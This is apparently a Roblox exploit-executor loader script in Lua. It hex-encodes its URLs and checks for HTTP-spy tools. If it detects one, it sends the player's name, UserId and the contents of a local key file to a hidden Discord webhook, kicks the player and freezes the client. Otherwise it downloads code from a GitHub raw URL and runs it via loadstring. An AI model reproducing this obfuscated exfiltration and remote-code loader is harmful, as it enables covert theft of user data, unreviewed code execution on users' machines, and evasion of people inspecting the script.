local function _D(h)
    local s = ""
    for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i+1), 16)) end
    return s
end

local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
local _L = game:GetService("Players").LocalPlayer
local _H = game:GetService("HttpService")

local function _SC()
    if not _req then return false end
    local ok, info = pcall(debug.getinfo, _req)
    if ok and info and (info.source ~= "=[C]" or info.what ~= "C") then return "HOOKED_REQUEST" end
    local ok2, info2 = pcall(debug.getinfo, game.HttpGet)
    if ok2 and info2 and info2.source ~= "=[C]" then return "HOOKED_HTTPGET" end
    
    local cg = game:GetService("CoreGui")
    local env = getgenv()
    for _, n in ipairs({"SimpleSpy", "HttpSpy", "HydroSpy", "VGG Spy", "TwiSpy", "NotDSF"}) do
        if cg:FindFirstChild(n) or env[n] then return "SPY_FOUND_" .. n end
    end
    
    local mt = getrawmetatable(game)
    if mt and mt.__namecall then
        local ok3, info3 = pcall(debug.getinfo, mt.__namecall)
        if ok3 and info3 and info3.source:lower():find("spy") then return "NAMECALL_HOOK" end
    end
    
    return false
end

local _se = _SC()
if _se then
    local _A = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")
    local tk = "N/A" pcall(function() tk = readfile("nazarkus_key.json") end)
    pcall(function()
        _req({
            Url = _A, Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = _H:JSONEncode({
                embeds = {{
                    title = "Security Alert: Advanced Interceptor Detected",
                    color = 16711680,
                    fields = {
                        {name = "Player", value = _L.Name .. " (" .. _L.UserId .. ")", inline = true},
                        {name = "Detection", value = tostring(_se), inline = true},
                        {name = "Device Key", value = "```" .. tk .. "```", inline = false}
                    }
                }}
            })
        })
    end)
    _L:Kick("Security Tamper Detected. Session Blocked.")
    while true do end return
end

local _TS = game:GetService("TestService")
local _ST = _TS:FindFirstChild("__NK_RUNTIME") or Instance.new("Folder", _TS)
_ST.Name = "__NK_RUNTIME"
local _AU = Instance.new("StringValue", _ST)
_AU.Name = _L.Name
_AU.Value = "V8_SECURE_AUTH"
shared._NK_AUTH = "V8_SECURE_AUTH"

-- ИСПРАВЛЕННАЯ ССЫЛКА (без буквы 'a')
local _G = _D("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F697473656173797270672F746573745F687474702F726566732F68656164732F6D61696E2F7270672E6C7561")
local ok, res = pcall(function() return game:HttpGet(_G) end)
if ok and res then
    local f = loadstring(res)
    if f then task.spawn(f) end
else
    _L:Kick("Error 0x82: Connection failed")
end
